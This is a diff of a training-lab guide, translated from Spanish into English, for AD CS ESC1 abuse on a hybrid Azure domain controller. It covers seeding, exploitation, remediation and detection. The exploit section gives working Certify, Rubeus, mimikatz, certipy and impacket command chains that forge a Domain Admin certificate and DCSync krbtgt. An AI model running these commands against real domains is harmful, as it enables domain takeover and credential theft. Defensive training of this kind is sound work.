@@ -1,131 +1,131 @@
-# AP05 — AD CS ESC1 (Enrollee-Supplies-Subject) en DC híbrido
+# AP05 — AD CS ESC1 (Enrollee-Supplies-Subject) on a hybrid DC
 
-**Capa:** Híbrido — AD DS + AD CS on-prem sobre Azure IaaS (módulo `hybrid-ad`)  
-**Coste:** el AP **más caro** del range — única VM **Windows always-on**. `Standard_B2ms` ~0,083 €/h (~60 €/mes 24×7) o `Standard_B2s` como suelo (~0,041 €/h, ~30 €/mes); disco StandardSSD 127 GiB ~8-10 €/mes; IP pública Standard ~3-4 €/mes; ingesta de Log Analytics (5 EventID filtrados, ~0,1-0,3 GB/día) pocos €/mes. Con **auto-shutdown** diario (2200) y uso ~8 h/día baja a ~⅓ → orientativo **~20-40 €/mes**; `./caelum.ps1 destroy` lo lleva a 0. (West Europe, pay-as-you-go — verifica el precio actual.)  
-**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates — *núcleo: AD CS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *Pass-the-Certificate* vía PKINIT) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)  
-**Mapea a cert:** CRTO / CRTE (AD CS abuse + Kerberos PKINIT + DCSync; lado defensivo adyacente: SC-200 / Microsoft Defender for Identity)  
-**Precondición sembrada por el range:** bosque `caelum.lab` + Enterprise Root CA `caelum-CA`, ambos en una sola VM Windows Server 2022; usuario de **bajo privilegio** `ap05user` (UPN `ap05user@caelum.lab`, solo miembro de `Domain Users`); y la plantilla de certificado **vulnerable** `CaelumAuthESC1`, sembrada por `scripts/seed-ap05.ps1` vía `az vm run-command` en el `deploy` (simetría exacta con `seed-ap01.ps1`). La auditoría de la CA y de Kerberos (imprescindible para la capa 🔵) la habilita la **base DSC**, no el seed. **Lo que NO se siembra:** ninguna credencial de Domain Admin — el DA se **compromete forjando el certificado**.
-
----
-
-## 🎯 Objetivo didáctico
-
-Que el alumno interiorice que **una plantilla de certificado mal configurada es una primitiva de toma de dominio**: ESC1 convierte a *cualquier usuario del dominio* en *cualquier Domain Admin* sin robar una sola contraseña, sin tocar primero el LSASS del DC y sin ningún rol administrativo de partida. El atacante no roba una identidad privilegiada: **se la fabrica** pidiéndole a la CA un certificado de autenticación cuyo *subject* (el SAN) él mismo elige.
-
-El eje conceptual es un único atributo *load-bearing*: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) en `msPKI-Certificate-Name-Flag`. Ese bit —y solo ese— permite al solicitante dictar la identidad que el certificado va a autenticar. Combinado con un EKU de autenticación, derechos de enrolamiento para principals de bajo privilegio, sin aprobación de manager y sin firmas RA, la cadena es determinista.
-
-Las **cinco condiciones de ESC1** (simultáneas) que el range siembra en `CaelumAuthESC1` — el mapa del exploit y, en espejo, el de la remediación:
-
-1. **Enroll de bajo privilegio (C1):** `Domain Users` tiene el *extended right* Certificate-Enrollment (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) en el `nTSecurityDescriptor` → `ap05user` hereda Enroll.
-2. **Sin aprobación de manager (C2):** `msPKI-Enrollment-Flag` **sin** `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`).
-3. **Sin firmas RA (C3):** `msPKI-RA-Signature = 0`.
-4. **EKU de autenticación de cliente (C4):** `pKIExtendedKeyUsage` / `msPKI-Certificate-Application-Policy` incluyen `1.3.6.1.5.5.7.3.2` (Client Authentication; equivalen Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, PKINIT Client Auth `1.3.6.1.5.2.3.4`, Any Purpose `2.5.29.37.0` o SubCA).
-5. **Enrollee-supplies-subject (C5 — el núcleo):** `msPKI-Certificate-Name-Flag` **con** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) → el solicitante dicta el SAN. *Ojo: `0x1` vive en `msPKI-Certificate-Name-Flag`, **no** en `msPKI-Enrollment-Flag` (confusión habitual); la aprobación de manager —`0x2`— sí vive en `msPKI-Enrollment-Flag`.*
-
-Rompe **cualquiera** de las cinco y ESC1 muere: por eso la sección 🟢 ofrece varios cortes independientes.
-
-**Contraste con AP01-AP04 (identity-only Entra) — primera capa híbrida del range.** AP01-AP04 escalan dentro de Microsoft Entra ID por concesión de rol o de credencial (consent, ownership de grupo, ownership de app). AP05 baja a **AD CS on-prem**: la escalada es **criptográfica** (forjar un certificado de autenticación y usarlo por PKINIT), y la telemetría ya no son logs cloud de Entra (`AuditLogs`/`SigninLogs`) sino **eventos de Seguridad de Windows** del DC/CA (`SecurityEvent`), que **no existen en ningún SIEM** salvo que el range los ingiera (ver 🔵). Como contrapartida, toda la superficie vulnerable vive en **una sola VM desechable**: el reset no deja residuo *out-of-state* (tan limpio como AP07).
+**Layer:** Hybrid — AD DS + AD CS on-prem over Azure IaaS (`hybrid-ad` module)  
+**Cost:** the **most expensive** AP in the range — the only **always-on Windows** VM. `Standard_B2ms` ~EUR 0.083/h (~EUR 60/month 24x7) or `Standard_B2s` as the floor (~EUR 0.041/h, ~EUR 30/month); a 127 GiB StandardSSD disk ~EUR 8-10/month; a Standard public IP ~EUR 3-4/month; Log Analytics ingestion (5 filtered EventIDs, ~0.1-0.3 GB/day) a few EUR/month. With daily **auto-shutdown** (2200) and ~8 h/day usage it drops to ~1/3 → roughly **~EUR 20-40/month**; `./azrange.ps1 destroy` takes it to 0. (West Europe, pay-as-you-go — check the current price.)  
+**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates — *core: AD CS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *Pass-the-Certificate* via PKINIT) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)  
+**Maps to cert:** CRTO / CRTE (AD CS abuse + Kerberos PKINIT + DCSync; adjacent defensive side: SC-200 / Microsoft Defender for Identity)  
+**Precondition seeded by the range:** the `azrange.lab` forest + Enterprise Root CA `azrange-CA`, both on a single Windows Server 2022 VM; a **low-privilege** user `ap05user` (UPN `ap05user@azrange.lab`, member of `Domain Users` only); and the **vulnerable** certificate template `AzRangeAuthESC1`, seeded by `scripts/seed-ap05.ps1` via `az vm run-command` during `deploy` (exact symmetry with `seed-ap01.ps1`). CA and Kerberos auditing (essential for the 🔵 layer) is enabled by the **DSC baseline**, not the seed. **What is NOT seeded:** any Domain Admin credential — the DA is **compromised by forging the certificate**.
 
 ---
 
-## 🔴 Rompe (cómo se explota)
+## 🎯 Learning objective
 
-> Laboratorio de entrenamiento autorizado, tenant/subscription de test propios. El bosque `caelum.lab` está aislado y **no** se sincroniza con ningún tenant (eso sería AP06). Todos los pasos parten de `ap05user` (bajo privilegio); el Domain Admin no se conoce de antemano.
+For the student to internalize that **a misconfigured certificate template is a domain-takeover primitive**: ESC1 turns *any domain user* into *any Domain Admin* without stealing a single password, without first touching the DC's LSASS, and with no administrative role to start from. The attacker does not steal a privileged identity: they **manufacture** it by asking the CA for an authentication certificate whose *subject* (the SAN) they choose themselves.
 
-La cadena canónica es `enrolamiento ESC1 → cert con SAN = UPN de un DA → PKINIT → TGT del DA → DCSync`. El range da **dos vías** según la postura de red que elija el operador.
+The conceptual axis is a single *load-bearing* attribute: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) in `msPKI-Certificate-Name-Flag`. That bit — and only that bit — lets the requester dictate the identity the certificate will authenticate. Combined with an authentication EKU, enrollment rights for low-privilege principals, no manager approval, and no RA signatures, the chain is deterministic.
 
-### Vía A — Windows nativo por RDP (UX primaria, sin exponer puertos AD)
+The **five conditions of ESC1** (all simultaneous) that the range seeds into `AzRangeAuthESC1` — the map of the exploit and, mirrored, that of the remediation:
 
-El NSG del módulo **no** abre LDAP/Kerberos/RPC a Internet. La ruta pensada es RDP al DC (desde `admin_source_cidr`) y ejecutar las herramientas Windows-nativas **como `ap05user`**. Referencia: **Certify.exe** + **Rubeus.exe** + **mimikatz** (GhostPack).
+1. **Low-privilege enroll (C1):** `Domain Users` has the Certificate-Enrollment *extended right* (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) in the `nTSecurityDescriptor` → `ap05user` inherits Enroll.
+2. **No manager approval (C2):** `msPKI-Enrollment-Flag` **without** `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`).
+3. **No RA signatures (C3):** `msPKI-RA-Signature = 0`.
+4. **Client authentication EKU (C4):** `pKIExtendedKeyUsage` / `msPKI-Certificate-Application-Policy` include `1.3.6.1.5.5.7.3.2` (Client Authentication; Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, PKINIT Client Auth `1.3.6.1.5.2.3.4`, Any Purpose `2.5.29.37.0`, or SubCA are equivalent).
+5. **Enrollee-supplies-subject (C5 — the core):** `msPKI-Certificate-Name-Flag` **with** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) → the requester dictates the SAN. *Note: `0x1` lives in `msPKI-Certificate-Name-Flag`, **not** in `msPKI-Enrollment-Flag` (a common mix-up); manager approval — `0x2` — does live in `msPKI-Enrollment-Flag`.*
+
+Break **any** of the five and ESC1 dies: that is why the 🟢 section offers several independent cuts.
+
+**Contrast with AP01-AP04 (identity-only Entra) — the range's first hybrid layer.** AP01-AP04 escalate inside Microsoft Entra ID through role or credential grants (consent, group ownership, app ownership). AP05 drops down to **on-prem AD CS**: the escalation is **cryptographic** (forge an authentication certificate and use it over PKINIT), and the telemetry is no longer Entra cloud logs (`AuditLogs`/`SigninLogs`) but **Windows Security events** from the DC/CA (`SecurityEvent`), which **do not exist in any SIEM** unless the range ingests them (see 🔵). As a trade-off, the entire vulnerable surface lives on **a single disposable VM**: the reset leaves no *out-of-state* residue (as clean as AP07).
+
+---
+
+## 🔴 Exploit (how it is exploited)
+
+> Authorized training lab, your own test tenant/subscription. The `azrange.lab` forest is isolated and does **not** sync with any tenant (that would be AP06). Every step starts from `ap05user` (low privilege); the Domain Admin is not known in advance.
+
+The canonical chain is `ESC1 enrollment → cert with SAN = a DA's UPN → PKINIT → DA's TGT → DCSync`. The range provides **two routes** depending on the network posture the operator chooses.
+
+### Route A — native Windows over RDP (primary UX, no AD ports exposed)
+
+The module's NSG does **not** open LDAP/Kerberos/RPC to the Internet. The intended path is RDP to the DC (from `admin_source_cidr`) and running the Windows-native tools **as `ap05user`**. Reference: **Certify.exe** + **Rubeus.exe** + **mimikatz** (GhostPack).
 
 ```powershell
-# RDP a <ap05_dc_public_ip> como CAELUM\ap05user (origen = admin_source_cidr)
+# RDP to <ap05_dc_public_ip> as AZRANGE\ap05user (source = admin_source_cidr)
 
-# 1. Enumerar plantillas vulnerables (ESC1)
+# 1. Enumerate vulnerable templates (ESC1)
 .\Certify.exe find /vulnerable
-#   → CaelumAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll de Domain Users
+#   → AzRangeAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll for Domain Users
 
-# 2. Solicitar el cert fijando el SAN = UPN de un Domain Admin
-.\Certify.exe request /ca:dc.caelum.lab\caelum-CA /template:CaelumAuthESC1 /altname:administrator
-#   → copia el bloque PEM (clave privada + cert) a cert.pem
+# 2. Request the cert, setting SAN = a Domain Admin's UPN
+.\Certify.exe request /ca:dc.azrange.lab\azrange-CA /template:AzRangeAuthESC1 /altname:administrator
+#   → copy the PEM block (private key + cert) to cert.pem
 
-# 3. PEM → PFX (Rubeus consume PFX)
+# 3. PEM → PFX (Rubeus consumes PFX)
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-#   (asigna una password al PFX; Rubeus la pide en el paso 4)
+#   (set a password on the PFX; Rubeus asks for it in step 4)
 
-# 4. PKINIT: pedir el TGT del DA con el cert forjado e inyectarlo en la sesión
+# 4. PKINIT: request the DA's TGT with the forged cert and inject it into the session
 .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt
 
-# 5. DCSync del krbtgt (o /all) con el TGT ya inyectado
-.\mimikatz.exe "lsadump::dcsync /domain:caelum.lab /user:krbtgt" exit
+# 5. DCSync krbtgt (or /all) with the already-injected TGT
+.\mimikatz.exe "lsadump::dcsync /domain:azrange.lab /user:krbtgt" exit
 ```
 
-### Vía B — certipy remoto (solo si el operador abrió los puertos AD a `admin_source_cidr`)
+### Route B — remote certipy (only if the operator opened the AD ports to `admin_source_cidr`)
 
-Si el operador relaja el NSG para exponer LDAP/Kerberos/RPC a su `/32`, el flujo equivalente desde una caja Linux del atacante con **certipy** (`ly4k`) + **impacket**:
+If the operator relaxes the NSG to expose LDAP/Kerberos/RPC to their `/32`, the equivalent flow from a Linux attacker box with **certipy** (`ly4k`) + **impacket**:
 
 ```bash
-# 1. Enumerar plantillas vulnerables como el usuario de bajo privilegio
-certipy find -u 'ap05user@caelum.lab' -p '<ap05user_pass>' \
+# 1. Enumerate vulnerable templates as the low-privilege user
+certipy find -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
   -dc-ip <ap05_dc_public_ip> -vulnerable -stdout
-#   → marca CaelumAuthESC1 como ESC1
+#   → flags AzRangeAuthESC1 as ESC1
 
-# 2. Solicitar el cert con SAN = UPN de un Domain Admin
-certipy req -u 'ap05user@caelum.lab' -p '<ap05user_pass>' \
-  -dc-ip <ap05_dc_public_ip> -ca 'caelum-CA' \
-  -template 'CaelumAuthESC1' -upn 'administrator@caelum.lab'
+# 2. Request the cert with SAN = a Domain Admin's UPN
+certipy req -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
+  -dc-ip <ap05_dc_public_ip> -ca 'azrange-CA' \
+  -template 'AzRangeAuthESC1' -upn 'administrator@azrange.lab'
 #   → administrator.pfx
 
-# 3. PKINIT con el cert forjado → TGT + (UnPAC-the-hash) hash NT del DA
+# 3. PKINIT with the forged cert → TGT + (UnPAC-the-hash) the DA's NT hash
 certipy auth -pfx 'administrator.pfx' -dc-ip <ap05_dc_public_ip>
-#   → administrator.ccache  +  NT hash de administrator
+#   → administrator.ccache  +  administrator's NT hash
 
-# 4. DCSync como Domain Admin (ticket o hash)
+# 4. DCSync as Domain Admin (ticket or hash)
 KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass \
-  'caelum.lab/administrator@dc.caelum.lab' -just-dc-user 'CAELUM/krbtgt'
-#   alternativa con el hash recuperado:
-#   impacket-secretsdump -hashes :<nt_hash> 'caelum.lab/administrator@<ap05_dc_public_ip>'
+  'azrange.lab/administrator@dc.azrange.lab' -just-dc-user 'AZRANGE/krbtgt'
+#   alternative with the recovered hash:
+#   impacket-secretsdump -hashes :<nt_hash> 'azrange.lab/administrator@<ap05_dc_public_ip>'
 ```
 
-Descubrimiento con grafo: **Certipy** marca la plantilla como vulnerable directamente; **BloodHound** (colector con soporte de AD CS / `Certipy ... -bloodhound`) dibuja la arista de enrolamiento de `ap05user` sobre `CaelumAuthESC1` y su ruta a Domain Admin.
+Graph-based discovery: **Certipy** flags the template as vulnerable directly; **BloodHound** (collector with AD CS support / `Certipy ... -bloodhound`) draws the enrollment edge from `ap05user` onto `AzRangeAuthESC1` and its path to Domain Admin.
 
-> **Caveat — el SAN lo pone el solicitante, no la plantilla.** `CaelumAuthESC1` no "contiene" al administrator: el bit `ENROLLEE_SUPPLIES_SUBJECT` deja que `-altname`/`-upn` lo inyecte en tiempo de solicitud. Por eso ESC1 puro **no** necesita `EDITF_ATTRIBUTESUBJECTALTNAME2` en la CA (eso sería ESC6, una ruta distinta y más ruidosa).
+> **Caveat — the SAN is set by the requester, not the template.** `AzRangeAuthESC1` does not "contain" administrator: the `ENROLLEE_SUPPLIES_SUBJECT` bit lets `-altname`/`-upn` inject it at request time. That is why pure ESC1 does **not** need `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA (that would be ESC6, a different and noisier route).
 
-> **Caveat — KB5014754 / strong mapping.** El lab corre con `StrongCertificateBindingEnforcement = 1` (Compatibility) **a propósito**, de modo que el KDC acepta el mapeo implícito por UPN y el PKINIT forjado funciona. Bajo **Full Enforcement** (valor `2`, o por defecto tras la actualización de seguridad del **9 de septiembre de 2025**) el KDC valida la extensión de SID del certificado (`szOID_NTDS_CA_SECURITY_EXT`, que porta el SID del **solicitante** `ap05user`, no el del SAN `administrator`) y **deniega** el logon → la cadena 🔴 falla y el lab *parece* «ya parcheado». certipy reciente puede incrustar un SID forjado (`-sid`), pero bajo Full Enforcement el forge igualmente cae porque el SID no casa con la cuenta autenticada. Esto **es** el fix de plataforma real (ver 🟢).
+> **Caveat — KB5014754 / strong mapping.** The lab runs with `StrongCertificateBindingEnforcement = 1` (Compatibility) **on purpose**, so the KDC accepts the implicit UPN mapping and the forged PKINIT works. Under **Full Enforcement** (value `2`, or the default after the **September 9, 2025** security update) the KDC validates the certificate's SID extension (`szOID_NTDS_CA_SECURITY_EXT`, which carries the **requester's** SID `ap05user`, not the SAN's `administrator`) and **denies** the logon → the 🔴 chain fails and the lab *appears* "already patched." Recent certipy can embed a forged SID (`-sid`), but under Full Enforcement the forge still fails because the SID does not match the authenticated account. This **is** the real platform fix (see 🟢).
 
-> **Caveat — propagación / auto-shutdown.** Ejecuta `deploy` + ataque en la misma sesión: una VM *deallocada* por el auto-shutdown (2200) no sirve RDP ni `az vm run-command`, y el DCPromo tarda ~15-25 min en quedar `Compliant` tras el primer `apply`.
+> **Caveat — propagation / auto-shutdown.** Run `deploy` + attack in the same session: a VM *deallocated* by the auto-shutdown (2200) serves neither RDP nor `az vm run-command`, and the DCPromo takes ~15-25 min to become `Compliant` after the first `apply`.
 
-### Toma del dominio
+### Domain takeover
 
-Con el hash de `krbtgt` del DCSync: **Golden Ticket** (persistencia total), o directamente el hash NT de `administrator` para `pass-the-hash`, creación de cuentas, modificación de GPO, etc. El certificado forjado, además, es **persistencia por sí mismo**: sobrevive a un cambio de contraseña del DA y es válido hasta que caduque o se revoque el cert.
+With the `krbtgt` hash from DCSync: **Golden Ticket** (full persistence), or directly administrator's NT hash for `pass-the-hash`, account creation, GPO modification, etc. The forged certificate is, moreover, **persistence in its own right**: it survives a DA password change and stays valid until it expires or the cert is revoked.
 
 ---
 
-## 🟢 Arregla (remediación)
+## 🟢 Remediate (remediation)
 
-Cada una de estas acciones **corta ESC1 por separado** (rompe una de las cinco condiciones). Aplícalas en profundidad.
+Each of these actions **cuts ESC1 independently** (breaks one of the five conditions). Apply them in depth.
 
-1. **Quitar `ENROLLEE_SUPPLIES_SUBJECT` (C5 — el antídoto directo).** Que el *subject* lo construya la CA a partir de AD, no el solicitante. En la GUI (`certtmpl.msc`): pestaña *Subject Name* → **desmarcar** «Supply in the request» → marcar «Build from this Active Directory information». A bajo nivel: limpiar el bit `0x1` de `msPKI-Certificate-Name-Flag`.
+1. **Remove `ENROLLEE_SUPPLIES_SUBJECT` (C5 — the direct antidote).** Have the CA build the *subject* from AD, not the requester. In the GUI (`certtmpl.msc`): *Subject Name* tab → **uncheck** "Supply in the request" → check "Build from this Active Directory information". At a low level: clear the `0x1` bit from `msPKI-Certificate-Name-Flag`.
 
-2. **Exigir aprobación de manager (C2).** Poner `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) en `msPKI-Enrollment-Flag`: cada solicitud queda *pending* hasta que un CA manager la aprueba → se acaba la emisión automática.
+2. **Require manager approval (C2).** Set `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) in `msPKI-Enrollment-Flag`: every request stays *pending* until a CA manager approves it → automatic issuance ends.
 
-3. **Restringir el ACL de Enroll (C1).** Retirar el *extended right* Certificate-Enrollment a `Domain Users` / `Authenticated Users` y dejarlo solo en principals explícitos y auditados. Una plantilla de autenticación **nunca** debería ser enrolable por todo el dominio.
+3. **Restrict the Enroll ACL (C1).** Remove the Certificate-Enrollment *extended right* from `Domain Users` / `Authenticated Users` and leave it only on explicit, audited principals. An authentication template should **never** be enrollable by the whole domain.
 
-4. **Despublicar la plantilla.** `certutil -SetCATemplates -CaelumAuthESC1` (o *Certification Authority* → *Certificate Templates* → *Delete*). Retira la plantilla de `certificateTemplates` del *Enrollment Services* → deja de ser **solicitable** aunque el objeto siga existiendo.
+4. **Unpublish the template.** `certutil -SetCATemplates -AzRangeAuthESC1` (or *Certification Authority* → *Certificate Templates* → *Delete*). It removes the template from the *Enrollment Services* `certificateTemplates` → it stops being **requestable** even though the object still exists.
 
-5. **Higiene de CA — `EDITF_ATTRIBUTESUBJECTALTNAME2` (defensa en profundidad, corta ESC6).** No es necesario para neutralizar ESC1 puro, pero una CA con este flag permite inyectar SANs arbitrarios **en cualquier** plantilla: desactívalo.
+5. **CA hygiene — `EDITF_ATTRIBUTESUBJECTALTNAME2` (defense in depth, cuts ESC6).** Not required to neutralize pure ESC1, but a CA with this flag allows arbitrary SANs to be injected **in any** template: disable it.
    ```powershell
    certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
    net stop certsvc && net start certsvc
    ```
 
-6. **KB5014754 — strong certificate mapping (control de plataforma / de fondo).** Llevar los DC a **Full Enforcement** (`StrongCertificateBindingEnforcement = 2`) hace que, aun con una plantilla mal configurada, el KDC rechace un cert cuyo SID de solicitante no case con la cuenta objetivo → el forge con SAN de DA deja de autenticar. Es el refuerzo que vuelve inefectiva toda la clase de ataques de SAN forjado.
+6. **KB5014754 — strong certificate mapping (platform / foundational control).** Moving the DCs to **Full Enforcement** (`StrongCertificateBindingEnforcement = 2`) means that, even with a misconfigured template, the KDC rejects a cert whose requester SID does not match the target account → the forge with a DA's SAN no longer authenticates. This is the reinforcement that renders the entire forged-SAN attack class ineffective.
 
-> **KB5014754 como control enseñable.** La base del lab fija `StrongCertificateBindingEnforcement = 1` (Compatibility) **a propósito**, para que el forge sea explotable. Desde la actualización de **febrero de 2025** los DC pasan a **Full Enforcement** por defecto si el valor no está configurado, y el *opt-out* a Compatibility **solo se honra hasta la actualización de seguridad del 9 de septiembre de 2025**. Si parcheas el DC más allá de esa fecha, cuenta con que el forge deje de funcionar (la pata 🔵 **sigue disparando**: la emisión del cert y el intento de PKINIT se registran igual, aunque el logon final se bloquee).
+> **KB5014754 as a teachable control.** The lab baseline sets `StrongCertificateBindingEnforcement = 1` (Compatibility) **on purpose**, so the forge is exploitable. Since the **February 2025** update, DCs move to **Full Enforcement** by default when the value is not configured, and the *opt-out* to Compatibility **is honored only until the September 9, 2025 security update**. If you patch the DC beyond that date, expect the forge to stop working (the 🔵 leg **still fires**: cert issuance and the PKINIT attempt are logged all the same, even though the final logon is blocked).
 
-### Remediación in-place en el range (el ejercicio "Arregla")
+### In-place remediation in the range (the "Remediate" exercise)
 
-`scripts/seed-ap05.ps1 -Remediate` corrige la plantilla **dejando el DC/CA/telemetría en pie**, para que el alumno re-ejecute el ataque y la detección contra el estado ya corregido y compruebe que `certipy find` deja de marcarla `-vulnerable`. Aplica varios cortes a la vez (limpia `0x1` de `msPKI-Certificate-Name-Flag`, añade `0x2` a `msPKI-Enrollment-Flag` y despublica). Invocación simétrica con el seed del `deploy`:
+`scripts/seed-ap05.ps1 -Remediate` fixes the template **while leaving the DC/CA/telemetry standing**, so the student can re-run the attack and detection against the already-corrected state and confirm that `certipy find` stops flagging it `-vulnerable`. It applies several cuts at once (clears `0x1` from `msPKI-Certificate-Name-Flag`, adds `0x2` to `msPKI-Enrollment-Flag`, and unpublishes). Invoked symmetrically with the `deploy` seed:
 
 ```bash
 az vm run-command invoke \
@@ -133,47 +133,47 @@ az vm run-command invoke \
   --command-id RunPowerShellScript \
   --scripts @scripts/seed-ap05.ps1 \
   --parameters Remediate=true EaPassword='<dc_admin_password>' \
-               DomainFqdn=caelum.lab DomainNetbios=CAELUM \
-               TemplateName=CaelumAuthESC1 CaCommonName=caelum-CA
+               DomainFqdn=azrange.lab DomainNetbios=AZRANGE \
+               TemplateName=AzRangeAuthESC1 CaCommonName=azrange-CA
 ```
 
-> **Dos niveles de reset — no los confundas.** (1) **Duro / coste→0:** `./caelum.ps1 reset` re-aplica con `enable_ap05 = false` (`count = 0`) → Terraform **destruye la VM entera** y con ella, atómicamente, la plantilla `CaelumAuthESC1`, los certificados forjados/emitidos y la CA DB. Es un reset sin residuo *out-of-state* (empata con AP07 como el más limpio del range): a diferencia de AP02/AP03/AP04 (donde las acciones del atacante quedan *fuera* del estado de Terraform y hay que limpiarlas a mano), aquí toda la superficie vulnerable vive en una VM desechable → cero residuo *out-of-state*, coste posterior cero. (2) **In-place / pedagógico:** `seed-ap05.ps1 -Remediate` (arriba). `./caelum.ps1 reset` **no** pre-remedia AP05 por `run-command` (divergencia deliberada frente a AP01: la vuln vive en la VM destruible, que además puede estar *deallocada* por el auto-shutdown y haría fallar el `run-command`). La plantilla **no** es un recurso `azurerm` (Terraform no gestiona plantillas de AD CS: son objetos del *Configuration NC* del DC) — justo esa propiedad es la que da el reset limpio. En un DC **vivo**, `enable_ap05=false` destruye la VM (y la plantilla), pero **no** "arregla" un DC en marcha hasta reaplicar/destruir; para eso está `-Remediate`.
+> **Two reset levels — do not confuse them.** (1) **Hard / cost→0:** `./azrange.ps1 reset` re-applies with `enable_ap05 = false` (`count = 0`) → Terraform **destroys the entire VM** and, with it, atomically, the `AzRangeAuthESC1` template, the forged/issued certificates, and the CA DB. It is a reset with no *out-of-state* residue (tied with AP07 as the cleanest in the range): unlike AP02/AP03/AP04 (where the attacker's actions land *outside* Terraform state and must be cleaned up by hand), here the entire vulnerable surface lives on a disposable VM → zero *out-of-state* residue, zero subsequent cost. (2) **In-place / pedagogical:** `seed-ap05.ps1 -Remediate` (above). `./azrange.ps1 reset` does **not** pre-remediate AP05 via `run-command` (a deliberate divergence from AP01: the vuln lives on the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail). The template is **not** an `azurerm` resource (Terraform does not manage AD CS templates: they are objects in the DC's *Configuration NC*) — that very property is what yields the clean reset. On a **live** DC, `enable_ap05=false` destroys the VM (and the template), but does **not** "fix" a running DC until you re-apply/destroy; that is what `-Remediate` is for.
 
 ---
 
-## 🔵 Detecta
+## 🔵 Detect
 
-La fuente son **eventos de Seguridad de Windows** del DC/CA (on-prem — **no** hay `AuditLogs`/`SigninLogs` de Entra). El módulo `hybrid-ad` **provisiona el pipeline por defecto** (gated por `enable_ap05 && collect_security_events`): **Azure Monitor Agent (AMA)** + **Data Collection Rule (DCR)** filtrada a 5 EventID + **Log Analytics** (o un Sentinel externo vía `existing_log_analytics_workspace_id`). Sin este pipeline los eventos **no existen en ningún SIEM**, así que "Detecta" solo es testeable de punta a punta si el range los ingiere. Tabla KQL: **`SecurityEvent`**.
+The source is **Windows Security events** from the DC/CA (on-prem — there are **no** Entra `AuditLogs`/`SigninLogs`). The `hybrid-ad` module **provisions the pipeline by default** (gated by `enable_ap05 && collect_security_events`): **Azure Monitor Agent (AMA)** + a **Data Collection Rule (DCR)** filtered to 5 EventIDs + **Log Analytics** (or an external Sentinel via `existing_log_analytics_workspace_id`). Without this pipeline the events **do not exist in any SIEM**, so "Detect" is only testable end to end if the range ingests them. KQL table: **`SecurityEvent`**.
 
 - KQL (Sentinel / Defender XDR): [`../../detections/kql/AP05-adcs-esc1.kql`](../../detections/kql/AP05-adcs-esc1.kql)
 - Sigma: [`../../detections/sigma/AP05-adcs-esc1.yml`](../../detections/sigma/AP05-adcs-esc1.yml)
 
-**Señales (tabla `SecurityEvent`):**
+**Signals (table `SecurityEvent`):**
 
-| Señal | EventID | Qué mirar |
+| Signal | EventID | What to look at |
 |---|---|---|
-| Solicitud de certificado a la CA | `4886` | `CertificateTemplate == CaelumAuthESC1`; *requester* = `ap05user` |
-| **Emisión** del certificado por la CA | `4887` | `CertificateTemplate == CaelumAuthESC1` — *honeytemplate*: **cualquier** emisión es sospechosa de por sí |
-| Cambio de plantilla / de seguridad del servicio de certificados | `4899` / `4900` | el propio **sembrado** o manipulación de la plantilla (el defensor *ve plantarse* la vuln) |
-| TGT Kerberos vía **PKINIT** | `4768` | *Certificate Information* poblada (`CertThumbprint`/`CertSerialNumber` no vacíos, `PreAuthType = 16`); cuenta = `administrator` |
-| (Complementario, canal *System*, post-KB5014754) | `Kerberos-Key-Distribution-Center 39/41` | SID del solicitante ≠ SID del subject → mapeo débil/rechazo |
+| Certificate request to the CA | `4886` | `CertificateTemplate == AzRangeAuthESC1`; *requester* = `ap05user` |
+| **Issuance** of the certificate by the CA | `4887` | `CertificateTemplate == AzRangeAuthESC1` — *honeytemplate*: **any** issuance is suspicious in itself |
+| Certificate-services template / security change | `4899` / `4900` | the **seeding** itself or tampering with the template (the defender *watches the vuln being planted*) |
+| Kerberos TGT via **PKINIT** | `4768` | *Certificate Information* populated (`CertThumbprint`/`CertSerialNumber` non-empty, `PreAuthType = 16`); account = `administrator` |
+| (Complementary, *System* channel, post-KB5014754) | `Kerberos-Key-Distribution-Center 39/41` | requester SID ≠ subject SID → weak mapping/rejection |
 
-**Prerrequisito imprescindible (lo habilita la base DSC, no el seed, para que persista entre ciclos seed/remediate):** auditoría de la CA (`certutil -setreg CA\AuditFilter 127` + `auditpol` subcategoría *Certification Services* + `Restart-Service certsvc`) para `4886/4887/4899/4900`, y *Audit Kerberos Authentication Service* (Success) para `4768`. Sin esto, **los eventos no se generan** y la detección falla en vacío. Como la DSC corre en `deploy` **antes** del seed post-apply, el propio sembrado de la plantilla ya dispara `4899/4900` — punto didáctico: el defensor observa cómo se planta la vulnerabilidad.
